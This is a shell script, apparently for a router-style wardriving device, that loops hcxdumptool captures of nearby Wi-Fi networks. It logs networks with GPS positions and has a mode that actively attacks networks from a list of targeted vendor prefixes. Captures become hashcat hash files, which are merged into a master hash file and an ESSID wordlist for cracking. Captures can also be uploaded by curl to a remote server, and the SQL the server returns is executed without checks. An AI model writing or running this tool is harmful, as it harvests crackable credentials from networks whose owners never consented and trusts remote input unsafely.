#!/bin/sh

# ===== SIGNAL TRAP FOR CLEAN SHUTDOWN =====
cleanup() {
    echo "[!] Caught signal - cleaning up..."
    kill -15 $(jobs -p) 2>/dev/null
    rm -f /var/run/wardriving_core.pid
    exit 0
}
trap cleanup SIGTERM SIGINT SIGHUP

# Start virtual GPS server if it doesn't exist
pkill -f "socat.*vGPS" 2>/dev/null
rm -f /tmp/vGPS_fifo
mkfifo /tmp/vGPS_fifo
socat pty,link=/tmp/vGPS,raw,echo=0 pipe:/tmp/vGPS_fifo &

# Función para parpadear un LED si existe (feedback visual)
blink_led() {
    # Intenta encontrar un LED que probablemente sea seguro usar
    _LED=$(ls /sys/class/leds/ 2>/dev/null | grep -iE "usb" | head -n 1)
    [ -z "$_LED" ] && _LED=$(ls /sys/class/leds/ 2>/dev/null | grep -iE "wps|wlan|wifi|system|power" | head -n 1)
    if [ -n "$_LED" ] && [ -f "/sys/class/leds/$_LED/brightness" ]; then
        _current=$(cat /sys/class/leds/$_LED/brightness)
        echo 0 > /sys/class/leds/$_LED/brightness
        usleep 100000 2>/dev/null || sleep 1
        echo 255 > /sys/class/leds/$_LED/brightness 2>/dev/null || echo 1 > /sys/class/leds/$_LED/brightness
        usleep 100000 2>/dev/null || sleep 1
        echo $_current > /sys/class/leds/$_LED/brightness
    fi
}

USB_FULL_COUNT=0
while true; do

    if ! mount | grep -q "/mnt/wardriving"; then
        echo "ERROR: USB NOT DETECTED"
        exit 1
    fi
    
    USB_PCT=$(df /mnt/wardriving | awk 'NR==2 {print $5}' | tr -d '%')
    if [ "$USB_PCT" -ge 95 ]; then
        USB_FULL_COUNT=$((USB_FULL_COUNT + 1))
        echo "ERROR: USB CAPACITY CRITICAL ($USB_PCT%). Count: $USB_FULL_COUNT" >> /tmp/wardriving_status.log
        blink_led
        # Auto-stop after ~5 minutes of persistent fullness (30 cycles * 10s avg)
        if [ "$USB_FULL_COUNT" -gt 30 ]; then
            echo "FATAL: USB full for too long. Stopping wardriving." >> /tmp/wardriving_status.log
            /etc/init.d/wardriving stop 2>/dev/null
            exit 1
        fi
        # Exponential backoff: 5s, 10s, 20s, 40s... capped at 300s
        BACKOFF=$(( 5 * (1 << (USB_FULL_COUNT < 6 ? USB_FULL_COUNT : 6)) ))
        [ "$BACKOFF" -gt 300 ] && BACKOFF=300
        sleep "$BACKOFF"
        continue
    fi
    USB_FULL_COUNT=0  # Reset counter when USB has space again


    TIMESTAMP=$(date +%Y%m%d_%H%M%S)
    FILENAME="/mnt/wardriving/wardriving_${TIMESTAMP}.pcapng"
    NMEAFILE="/mnt/wardriving/wardriving_${TIMESTAMP}.nmea"
    HC2200FILE="/mnt/wardriving/wardriving_${TIMESTAMP}.hc2200"
    TMP_ESSID="/tmp/essid_${TIMESTAMP}.txt"
    
    echo "[*] Starting session: $FILENAME"
        OPTS=""
    if [ -f /etc/wardriving_mode.txt ]; then
        MODE=$(cat /etc/wardriving_mode.txt)
        if [ "$MODE" = "passive" ]; then
            OPTS="--silent"
            echo "[*] MODE: PASSIVE (Silent Site Survey)"
        elif [ "$MODE" = "smart" ]; then
            if [ -s /etc/wardriving_targets.txt ]; then
                # format targets for hcxdumptool: 112233
                cat /etc/wardriving_targets.txt | sed 's/://g' > /tmp/smart_targets.txt
                OPTS="--filterlist_ap=/tmp/smart_targets.txt --filtermode=2"
                echo "[*] MODE: SMART TARGETING (Attacking only targeted OUIs)"
            else
                echo "[*] MODE: SMART TARGETING (No targets defined, defaulting to PASSIVE)"
                OPTS="--silent"
            fi
        fi
    fi

    # shellcheck disable=SC2086 # OPTS needs word splitting for multi-flag modes
    hcxdumptool -i wlan0mon -w "$FILENAME" --nmea_dev=/tmp/vGPS --nmea_pcapng --nmea_out="$NMEAFILE" -F -t 3 --tot=1 $OPTS
    
    if [ -f "$FILENAME" ]; then
        REMOTE_ENABLED="0"
        [ -f /etc/wardriving_remote_enabled ] && REMOTE_ENABLED=$(cat /etc/wardriving_remote_enabled)
        REMOTE_URL=""
        [ -f /etc/wardriving_remote_url ] && REMOTE_URL=$(cat /etc/wardriving_remote_url)
        
        PROCESSED_REMOTE=0
        if [ "$REMOTE_ENABLED" = "1" ] && [ -n "$REMOTE_URL" ]; then
            echo "[*] Sending $FILENAME to remote server ($REMOTE_URL) ..."
            HTTP_CODE=$(curl -s -o "/tmp/respuesta_server.sql" -w "%{http_code}" -X POST -F "pcap=@$FILENAME" "$REMOTE_URL" --connect-timeout 10)
            if [ "$HTTP_CODE" = "200" ]; then
                echo "[+] Remote server processed capture successfully."
                PROCESSED_REMOTE=1
                
                # Inyectar SQL si el servidor devolvio algo util
                if [ -s "/tmp/respuesta_server.sql" ]; then
                    sqlite3 /mnt/wardriving/wardriving.db "CREATE TABLE IF NOT EXISTS networks (mac TEXT PRIMARY KEY, ssid TEXT, enc TEXT, channel INTEGER, lat REAL, lon REAL, first_seen DATETIME, last_seen DATETIME, rssi INTEGER);"
                    sqlite3 /mnt/wardriving/wardriving.db "PRAGMA journal_mode=WAL; CREATE INDEX IF NOT EXISTS idx_last_seen ON networks(last_seen);" > /dev/null 2>&1
                    sqlite3 /mnt/wardriving/wardriving.db < "/tmp/respuesta_server.sql"
                fi
                rm -f "/tmp/respuesta_server.sql"
                rm -f "$FILENAME"
            else
                echo "[-] Remote server failed (Code: $HTTP_CODE). Falling back to local processing..."
            fi
        fi

        if [ "$PROCESSED_REMOTE" = "0" ]; then
            echo "[*] Converting $FILENAME to $HC2200FILE"
            nice -n 10 hcxpcapngtool -o "$HC2200FILE" -E "$TMP_ESSID" --csv="/tmp/csv_${TIMESTAMP}.txt" "$FILENAME" > /dev/null 2>&1
            
            # SQLite Integration
            if command -v sqlite3 >/dev/null 2>&1 && [ -s "/tmp/csv_${TIMESTAMP}.txt" ]; then
                sqlite3 /mnt/wardriving/wardriving.db "CREATE TABLE IF NOT EXISTS networks (mac TEXT PRIMARY KEY, ssid TEXT, enc TEXT, channel INTEGER, lat REAL, lon REAL, first_seen DATETIME, last_seen DATETIME, rssi INTEGER);"
                sqlite3 /mnt/wardriving/wardriving.db "PRAGMA journal_mode=WAL; CREATE INDEX IF NOT EXISTS idx_last_seen ON networks(last_seen);" > /dev/null 2>&1
                
                awk -F'\t' '{
                    mac=$2; ssid=$3; enc=$4; chan=$8; rssi=$9; gpsd=$11
                    gsub(/\047/, "\047\047", ssid)
                    lat="NULL"; lon="NULL"
                    split(gpsd, g, " ")
                    if(g[1] != "") lat=g[1]; if(g[2] != "") lon=g[2]
                    printf "INSERT INTO networks (mac, ssid, enc, channel, lat, lon, first_seen, last_seen, rssi) VALUES (\047%s\047, \047%s\047, \047%s\047, %d, %s, %s, \047%s\047, \047%s\047, %d) ON CONFLICT(mac) DO UPDATE SET last_seen=\047%s\047, rssi=EXCLUDED.rssi;\n", mac, ssid, enc, chan, lat, lon, $1, $1, rssi, $1
                }' "/tmp/csv_${TIMESTAMP}.txt" > "/tmp/sql_${TIMESTAMP}.sql"
                
                nice -n 10 sqlite3 /mnt/wardriving/wardriving.db < "/tmp/sql_${TIMESTAMP}.sql"
                rm -f "/tmp/csv_${TIMESTAMP}.txt" "/tmp/sql_${TIMESTAMP}.sql"
            fi
            
            # Si la conversión generó un hash
            if [ -s "$HC2200FILE" ]; then
                blink_led
                # Fusionar hashes para sincronización
                cat "$HC2200FILE" >> /mnt/wardriving/master.hc2200
                nice -n 10 sort -u /mnt/wardriving/master.hc2200 -o /mnt/wardriving/master.hc2200
            fi
            
            # Limpiar el hc2200 individual (si estaba vacio se borra, si tenia hashes ya estan en el master)
            rm -f "$HC2200FILE"
            
            # Guardar diccionario de ESSID descubiertos
            if [ -s "$TMP_ESSID" ]; then
                cat "$TMP_ESSID" >> /mnt/wardriving/master_essid.txt
                sort -u /mnt/wardriving/master_essid.txt -o /mnt/wardriving/master_essid.txt
                rm -f "$TMP_ESSID"
            fi
        fi
        
        # Retencion configurable del pcapng
        if [ ! -f /etc/wardriving_keep_pcap.txt ]; then
            rm -f "$FILENAME"
        fi
    fi

    # Truncate log only when it grows excessively (avoid unnecessary I/O)
    LOG_SIZE=$(wc -l < /tmp/wardriving_status.log 2>/dev/null || echo 0)
    if [ "$LOG_SIZE" -gt 3000 ]; then
        tail -n 2000 /tmp/wardriving_status.log > /tmp/wardriving_status.tmp 2>/dev/null && mv /tmp/wardriving_status.tmp /tmp/wardriving_status.log
    fi

    sync
    sleep 2
done
